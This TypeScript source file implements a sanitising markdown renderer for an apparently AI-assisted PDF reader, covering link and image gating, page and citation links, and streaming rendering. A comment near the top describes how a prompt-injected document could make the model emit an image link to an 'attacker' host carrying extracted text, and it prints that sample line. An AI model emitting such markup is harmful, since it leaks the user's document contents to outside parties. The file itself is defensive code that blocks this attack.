import {
  createContext,
  memo,
  useContext,
  useEffect,
  useMemo,
  useRef,
  type HTMLAttributes,
  type ReactNode,
} from "react";
import ReactMarkdown, { defaultUrlTransform } from "react-markdown";
import remarkGfm from "remark-gfm";
import { openUrl } from "@tauri-apps/plugin-opener";
import { isSafeLink, schemeOf } from "../lib/safe-link";
import type { AnchorHTMLAttributes, ImgHTMLAttributes } from "react";
import { useStreamingReveal } from "../hooks/useStreamingReveal";
import { remarkPageRefs, PAGE_REF_SCHEME } from "../lib/remark-page-refs";
import { remarkCitations, parseCitationUrl, CITATION_SCHEME } from "../lib/remark-citations";
import { hideOpenCitation } from "../lib/citations";
import { CitationChip } from "./CitationChip";

/** Handler that jumps the preview to a page when a page citation is clicked. */
export const PageRefContext = createContext<((page: number) => void) | null>(null);

function PageRefLink({ page, children }: { page: number; children: ReactNode }) {
  const onJump = useContext(PageRefContext);
  if (!onJump || !Number.isFinite(page)) return <>{children}</>;
  return (
    // raw-button: an inline affordance inside a sentence — it has to read as text, not as a control
    <button type="button" className="page-ref-link" onClick={() => onJump(page)}>
      {children}
    </button>
  );
}

interface MarkdownProps {
  children: string;
  /** When true, completed paragraphs are parsed once; the tail re-parses on each update. */
  live?: boolean;
}

// Shared with the PDF link layer: document URLs and model-authored URLs are
// both untrusted, and both go through the same gate.
// http(s) is deliberately absent: model-authored markdown must never auto-fetch
// a remote URL. A prompt-injected document could make the model emit
// ![x](https://attacker/?d=<extracted text>) and exfiltrate on render.
const SAFE_IMG_SCHEMES = ["asset:", "data:"];

// Citations before page references: a marker becomes a link first, and
// `remarkPageRefs` leaves links alone.
const remarkPlugins = [remarkGfm, remarkCitations, remarkPageRefs];
const fastTailPlugins = [remarkCitations, remarkPageRefs];
const GFM_SYNTAX_RE = /[|~^[\]]|https?:|www\./i;

/**
 * Let the page-citation scheme survive react-markdown's URL sanitizer.
 *
 * `defaultUrlTransform` returns "" for any protocol outside its allowlist
 * (http, https, mailto, tel, …), and `pagewise-page:` is not on it. So every
 * link `remarkPageRefs` produced arrived at SafeAnchor with an empty href,
 * missed the scheme branch, failed `isSafeLink`, and rendered as a bare
 * <span> — "See page 2" stayed as plain text in every answer the assistant
 * ever gave, and clicking a citation to jump the preview did nothing.
 *
 * Nothing failed loudly. remarkPageRefs' own tests pass: they assert the mdast
 * transform, which was always correct. The loss happened one layer below them,
 * between the plugin and the anchor renderer.
 *
 * Everything else still goes through the sanitizer unchanged — this widens the
 * allowlist by exactly one internal scheme that never leaves the app.
 */
const urlTransform = (url: string) =>
  url.startsWith(PAGE_REF_SCHEME) || url.startsWith(CITATION_SCHEME) ? url : defaultUrlTransform(url);

/** The plain text of a cell's children, for the numeric-column test below. */
function textOf(children: ReactNode): string {
  if (typeof children === "string" || typeof children === "number") return String(children);
  if (Array.isArray(children)) return children.map(textOf).join("");
  if (children && typeof children === "object" && "props" in children) {
    return textOf((children as { props?: { children?: ReactNode } }).props?.children);
  }
  return "";
}

/**
 * Does this cell hold a number, and nothing else worth reading?
 *
 * CSS cannot tell a numeric column from a prose one, so the alignment is
 * decided here instead: currency, sign, thousands separators, percent, and a
 * short unit are allowed; anything with letters in the value (a date, a name, a
 * phrase) is not, because right-aligning "as agreed" is worse than leaving it.
 */
function isNumericCell(children: ReactNode): boolean {
  const text = textOf(children).trim();
  if (!text || text.length > 24) return false;
  return /^[¥$€£₩]?\s*-?\d[\d,._\s]*\s*%?$/.test(text);
}

type CellProps = { children?: ReactNode; node?: unknown };

function TableCell({ children, node: _node, className, ...rest }: CellProps & { className?: string }) {
  const numeric = isNumericCell(children);
  return (
    <td {...rest} className={[className, numeric ? "md-num" : ""].filter(Boolean).join(" ") || undefined}>
      {children}
    </td>
  );
}

function TableHeadCell({ children, node: _node, className, ...rest }: CellProps & { className?: string }) {
  const numeric = isNumericCell(children);
  return (
    <th {...rest} className={[className, numeric ? "md-num" : ""].filter(Boolean).join(" ") || undefined}>
      {children}
    </th>
  );
}

/**
 * A wrapper that scrolls, so a wide table scrolls itself rather than the panel
 * (or the window) — the failure a fixed-width reading column would otherwise
 * make routine.
 */
function TableWrap({ children, node: _node, ...rest }: CellProps) {
  return (
    <div className="md-table-wrap">
      <table {...rest}>{children}</table>
    </div>
  );
}

function CiteClaimSpan({
  children,
  className,
  node: _node,
  ...rest
}: HTMLAttributes<HTMLSpanElement> & { node?: unknown }) {
  const ref = useRef<HTMLSpanElement | null>(null);
  const isCiteClaim = typeof className === "string" && className.split(/\s+/).includes("cite-claim");

  useEffect(() => {
    const el = ref.current;
    if (!el || !isCiteClaim || !el.parentElement) return;
    const sync = () => {
      let sib = el.nextElementSibling;
      let idx = 0;
      let laterChipNotFound = false;
      while (sib && sib.classList.contains("cite")) {
        if (idx > 0 && sib.classList.contains("cite-level-notFound")) {
          laterChipNotFound = true;
          break;
        }
        idx += 1;
        sib = sib.nextElementSibling;
      }
      if (laterChipNotFound) {
        el.dataset.citeNotFound = "true";
        el.style.textDecoration = "underline dashed var(--danger)";
        el.style.textDecorationThickness = "1px";
        el.style.textUnderlineOffset = "3px";
      } else {
        delete el.dataset.citeNotFound;
        el.style.textDecoration = "";
        el.style.textDecorationThickness = "";
        el.style.textUnderlineOffset = "";
      }
    };
    sync();
    const obs = new MutationObserver(sync);
    obs.observe(el.parentElement, {
      subtree: true,
      childList: true,
      attributes: true,
      attributeFilter: ["class"],
    });
    return () => obs.disconnect();
  }, [isCiteClaim, children]);

  return (
    <span ref={ref} {...rest} className={className}>
      {children}
    </span>
  );
}

const markdownComponents = {
  a: SafeAnchor,
  img: SafeImg,
  span: CiteClaimSpan,
  table: TableWrap,
  td: TableCell,
  th: TableHeadCell,
};

function SafeAnchor({
  href,
  children,
  node: _node,
  ...rest
}: AnchorHTMLAttributes<HTMLAnchorElement> & { node?: unknown }) {
  const target = typeof href === "string" ? href : "";
  if (target.startsWith(CITATION_SCHEME)) {
    const link = parseCitationUrl(target);
    return link ? <CitationChip link={link}>{children}</CitationChip> : <>{children}</>;
  }
  if (target.startsWith(PAGE_REF_SCHEME)) {
    const page = parseInt(target.slice(PAGE_REF_SCHEME.length), 10);
    return <PageRefLink page={page}>{children}</PageRefLink>;
  }
  if (!isSafeLink(target)) {
    return <span {...rest}>{children}</span>;
  }

  return (
    <a
      {...rest}
      href={target}
      onClick={(e) => {
        e.preventDefault();
        void openUrl(target);
      }}
    >
      {children}
    </a>
  );
}

function SafeImg({
  src,
  alt,
  node: _node,
  ...rest
}: ImgHTMLAttributes<HTMLImageElement> & { node?: unknown }) {
  const target = typeof src === "string" ? src : "";
  const scheme = schemeOf(target);
  // Remote images render as a click-to-open link instead of auto-fetching
  // (fetching would leak whatever the URL encodes without any user action).
  if (scheme === "https:" || scheme === "http:") {
    return (
      <a
        href={target}
        onClick={(e) => {
          e.preventDefault();
          // Linked images ([![alt](img)](url)) nest inside SafeAnchor — without
          // this, one click would bubble up and open BOTH URLs.
          e.stopPropagation();
          void openUrl(target);
        }}
      >
        {alt?.trim() || target}
      </a>
    );
  }
  if (!scheme || !SAFE_IMG_SCHEMES.includes(scheme)) return null;
  return <img {...rest} alt={alt} src={target} referrerPolicy="no-referrer" loading="lazy" />;
}

/**
 * Split at the last completed paragraph outside fenced code blocks so streaming
 * only re-parses the tail.
 */
export function splitStreamingMarkdown(text: string): { stable: string; tail: string } {
  let inFence = false;
  let lastSafeSplit = -1;
  let offset = 0;

  const lines = text.split("\n");
  for (let i = 0; i < lines.length; i++) {
    const line = lines[i]!;
    const trimmed = line.trimStart();
    if (trimmed.startsWith("```")) {
      inFence = !inFence;
    }

    offset += line.length;
    if (i < lines.length - 1) {
      if (!inFence && line === "" && i > 0 && lines[i - 1] !== "") {
        lastSafeSplit = offset;
      }
      offset += 1;
    }
  }

  if (lastSafeSplit === -1) return { stable: "", tail: text };
  return {
    stable: text.slice(0, lastSafeSplit).replace(/\n+$/, ""),
    tail: text.slice(lastSafeSplit).replace(/^\n+/, ""),
  };
}

const ParsedMarkdown = memo(function ParsedMarkdown({ text }: { text: string }) {
  if (!text) return null;
  return (
    <ReactMarkdown remarkPlugins={remarkPlugins} components={markdownComponents} urlTransform={urlTransform}>
      {text}
    </ReactMarkdown>
  );
});

// The streaming tail re-parses on every chunk. Unwrap the paragraph wrapper so
// inline markup (bold, italic, code, links) renders live and stays inline next
// to the blinking caret — otherwise raw `**`/`_`/`` ` `` characters flicker in
// the tail until the paragraph closes and moves into the stable block above.
const tailComponents = {
  ...markdownComponents,
  p: ({ children }: { children?: ReactNode }) => <>{children}</>,
};

const ParsedTail = memo(function ParsedTail({ text }: { text: string }) {
  if (!text) return null;
  const plugins = GFM_SYNTAX_RE.test(text) ? remarkPlugins : fastTailPlugins;
  return (
    <ReactMarkdown remarkPlugins={plugins} components={tailComponents} urlTransform={urlTransform}>
      {text}
    </ReactMarkdown>
  );
});

function MarkdownInner({ children, live = false }: MarkdownProps) {
  const revealed = useStreamingReveal(children, live);
  const { stable, tail } = useMemo(() => {
    if (!live) return { stable: "", tail: revealed };
    const split = splitStreamingMarkdown(revealed);
    // Half a citation marker is noise until its closing bracket arrives.
    return { stable: split.stable, tail: hideOpenCitation(split.tail) };
  }, [revealed, live]);

  if (!live) {
    return (
      <div className="markdown">
        <ParsedMarkdown text={children} />
      </div>
    );
  }

  return (
    <div className="markdown markdown-streaming">
      {stable ? <ParsedMarkdown text={stable} /> : null}
      {tail ? (
        <span className="markdown-stream-tail">
          <ParsedTail text={tail} />
          <span className="markdown-stream-caret" aria-hidden />
        </span>
      ) : null}
    </div>
  );
}

export const Markdown = memo(MarkdownInner, (prev, next) => {
  if (prev.live !== next.live) return false;
  return prev.children === next.children;
});
